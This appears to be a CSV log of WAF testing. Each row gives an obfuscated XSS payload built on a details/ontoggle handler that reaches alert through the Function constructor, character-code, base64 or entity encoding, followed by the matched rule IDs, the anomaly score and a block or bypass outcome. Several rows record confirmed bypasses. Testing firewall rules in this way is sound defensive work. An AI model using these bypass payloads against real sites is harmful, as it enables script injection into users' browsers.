558,"<details open ontoggle=""(new Function('return\u0009al'+'ert')).call()(2)"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,74 || o25,13v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603359814.144714
559,"<details open ontoggle=""(new Function(String['fromCharCode'](114,101,116,117,114,110,32,97,108,101,114,116))).call()(2)"">",0,1,block,5,"933210,934100,941100,941120,949110","o24,95v217,121t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,121 || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603359954.235964
560,"<details open ontoggle=""(new Function('return wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,52v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,78 || o25,13v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603360080.723748
561,"<details open ontoggle=""(Function.constructor('return wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,4,"933210,941100,941120,949110","o24,60v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603360172.443011
564,"<details open ontoggle=""(new Function('retur\u006E wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,83 || o25,13v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603360480.002087
566,"<details open ontoggle=""(new Function('return wind'+'ow.ale'+'rt'))()('XSS')"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,52v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,78 || o25,13v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760336052.020722
567,"<details open ontoggle=""(new Function('return wind'+'ow.pro'+'mpt'))()('XSS')"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,53v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,79 || o25,13v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603360621.004879
568,"<details open ontoggle=""(new Function('return wind'+'ow.con'+'firm'))()('XSS')"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,54v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,80 || o25,13v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603360891.284004
569,"<details open ontoggle=""(new Function('return wind'+'ow')).call()['ale'+'rt']('XSS')"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,60v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,86 || o25,13v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603360856.248628
570,"<details open ontoggle=""(new Function('return this.wind'+'ow.ale'+'rt'))()('XSS')"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,57v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,83 || o25,13v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603360990.094364
571,"<details open ontoggle=""(new Function('return self.ale'+'rt'))()('XSS')"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,47v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,73 || o25,13v217,73t:urlDecodeUni || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760336109.061150
572,"<details open ontoggle=""(new Function('return parent.ale'+'rt'))()('XSS')"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,49v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,75 || o25,13v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603361164.596010
573,"<details open ontoggle=""(new Function('return top.ale'+'rt'))()('XSS')"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,46v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,72 || o25,13v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603361217.056204
574,"<details open ontoggle=""(new Function('return frames.ale'+'rt'))()('XSS')"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,49v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,75 || o25,13v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603361379.606012
575,"<details open ontoggle=""(new Function('return globalThis.ale'+'rt'))()('XSS')"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,53v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,79 || o25,13v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603361492.759475
576,"<details open ontoggle=""(new Function(`return wind${'ow.al'}ert`))()('XSS')"">",0,1,block,5,"932130,934100,941100,941120,949110","o49,8v217,77t:urlDecodeUni,t:cmdLine || o25,13v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603361582.165589
577,"<details open ontoggle=""(new Function(String.fromCharCode(114,101,116,117,114,110,32,119,105,110,100,111,119,46,97,108,101,114,116)))()('XSS')"">",0,1,block,4,"934100,941100,941120,949110","o25,13v217,144 || v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603361695.511732
578,"<details open ontoggle=""(new Function(atob('cmV0dXJuIHdpbmRvdy5hbGVydA==')))()('XSS')"">",0,1,block,4,"934100,941100,941120,949110","o25,13v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603361736.434812
579,"<details open ontoggle=""(new Function('return wind'+'ow'+'.ale'+'rt'))()('XSS')"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,55v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,81 || o25,13v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603361895.183586
580,"<details open ontoggle=""(new Function(String['fromCharCode'](97,108,101,114,116)+'(49)'))()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,67v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,93 || o25,13v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603361925.454165
581,"<details open ontoggle=""(new Function(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)+'(49)'))()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,96 || o25,13v217,96t:urlDecodeUni || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603362033.209261
582,"<details open ontoggle=""(new Function(atob('YWxlcnQ=')+'(49)'))()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,67 || o25,13v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603362133.569124
584,"<details open ontoggle=""(new Function(String['fromCharCode'](97)+String['fromCharCode'](108,101,114,116)+'(49)'))()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,91v217,117t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,117 || o25,13v217,117t:urlDecodeUni || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603362356.986091
586,"<details open ontoggle=""(new Function(unescape('%61%6c%65%72%74')+'(49)'))()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,42v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,78 || o25,13v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603362572.103465
587,"<details open ontoggle=""(new Function(decodeURIComponent('%61%6c%65%72%74')+'(49)'))()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,52v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,88 || o25,13v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603362696.897600
592,"<details open ontoggle=""(new Function([String.fromCharCode(97),String.fromCharCode(108),String.fromCharCode(101),String.fromCharCode(114),String.fromCharCode(116)].join('')+'(49)'))()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o157,26v217,185t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,185 || o25,13v217,185t:urlDecodeUni || v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603363161.061583
593,"<details open ontoggle=""(new Function(window[String.fromCharCode(97,116,111,98)](String.fromCharCode(89,87,120,108,99,110,81,61))+'(49)'))()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,13v217,142 || o25,13v217,142t:urlDecodeUni || v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o38,42v217,142t:urlDecodeUni,t:compressWhitespace || ",25,177603363231.801337
594,"<details open ontoggle=""(new Function(String.fromCodePoint(97,108,101,114,116)+'(49)'))()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,91 || o25,13v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603363357.585064
595,"<details open ontoggle=""(new Function('\u0061\u006c\u0065\u0072\u0074'+'(49)'))()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,83 || o25,13v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603363414.874857
597,"<details open ontoggle=""(new Function(eval(String.fromCharCode(83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,57,55,44,49,48,56,44,49,48,49,44,49,49,52,44,49,49,54,41))+'(49)'))()"">",0,1,block,6,"933160,934100,934100,941100,941120,949110","o38,168v217,208 || o25,13v217,208 || o25,13v217,208t:urlDecodeUni || v217,208t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,208t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603363567.658942
599,"<details open ontoggle=""(new Function([97,108,101,114,116].reduce((a,c)=>a+String.fromCharCode(c),'')+'(49)'))()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,114 || o25,13v217,114t:urlDecodeUni || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603363745.288532
600,"<details open ontoggle=""Function(&quot;\u0061\u006C\u0065\u0072\u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603363830.993899
602,"<details open ontoggle=""Function(&quot;&#97;&#108;&#101;&#114;&#116;(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603364021.172817
605,"<details open ontoggle=""window['Function'](&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"">",0,1,block,4,"941100,941120,941370,949110","v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,93t:urlDecodeUni,t:compressWhitespace || ",15,177603364396.438194
607,"<details open ontoggle=""Function(&quot;al&quot;+&quot;ert(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603364595.652077
610,"<details open ontoggle=""Function(String.fromCharCode(97,108,101,114,116,40,49,41))()"">",0,1,block,4,"934100,941100,941120,949110","o33,19v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603364856.320837
612,"<details open ontoggle=""parent['Function'](&quot;\u0061lert(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603365033.318642
613,"<details open ontoggle=""Function(&quot;\u0061\u006c&#101;&#114;&#116;(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603365114.036873
617,"<details open ontoggle=""Function(&quot;\141\154\145\162\164(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603365545.523297
618,"<details open ontoggle=""Function(atob(&quot;YWxlcnQoMSk=&quot;))()"">",0,1,bypass,2,"941100,941120","v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603365660.533794
619,"<details open ontoggle=""Function(&quot;a&quot;.concat(&quot;lert(1)&quot;))()"">",0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760336572.519508
621,"<details open ontoggle=""(function(){return function(){return Function}})()()('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,5,"933210,934100,941100,941120,949110","o24,90v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,116 || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603365932.155345
622,"<details open ontoggle=""top['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o27,50v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,79t:urlDecodeUni,t:compressWhitespace || ",20,177603366099.992136
626,"<details open ontoggle=""Function`&#97;&#108;&#101;&#114;&#116;(1)`()"">",0,1,bypass,2,"941100,941120","v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603366475.894450
627,"<details open ontoggle=""(()=>Function('&#97;&#108;&#101;&#114;&#116;(1)'))()()"">",0,1,block,4,"933210,941100,941120,949110","o68,10v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603366517.225619
628,"<details open ontoggle=""Function['constructor']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o32,53v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603366634.461458
629,"<details open ontoggle=""(1,Function)('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,bypass,2,"941100,941120","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603366715.160261
630,"<details open ontoggle=""new/**/Function('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603366837.161860
634,"<details open ontoggle=""(true,Function)('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603367126.641873
638,"<details open ontoggle=""Function(atob('YWxlcnQoMSk'))()"">",0,1,bypass,2,"941100,941120","v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603367535.681084
641,"<details open ontoggle=""top['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,58t:urlDecodeUni,t:compressWhitespace || ",20,177603367887.513697
645,"<details open ontoggle=""Function['constructor']('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o32,32v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603368222.132411
647,"<details open ontoggle=""globalThis['Function']('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o34,29v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603368485.972823
648,"<details open ontoggle=""(function(){return this})()['Function']('al'+'ert(1)')()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,56v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,82 || o25,11v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603368568.157449
651,"<details open ontoggle=""Function(`al`+`ert(1)`)()"">",0,1,block,4,"941100,941120,942100,949110","v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,51 || ",15,177603368823.898717
654,"<details open ontoggle=""Function(String['fromCharCode'](97,108,101,114,116,40,49,41))()"">",0,1,block,4,"933210,941100,941120,949110","o32,55v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603369168.190626
655,"<details open ontoggle=""Function(atob('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941120","v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603369291.663519
659,"<details open ontoggle=""new Function('al'+'ert(1)')()"">",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v216,55 || o24,13v216,55t:urlDecodeUni || v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603369696.768771
662,"<details open ontoggle=""(()=>Function('al'+'ert(1)')())()""></details>",0,1,block,4,"933210,941100,941120,949110","o37,20v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603369995.609827
676,"<details open ontoggle=""(function(){return Function})()('al'+'ert(1)')()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,48v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,84 || o25,11v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603371244.334326
679,"<details open ontoggle=""Function['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o32,32v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760337151.089913
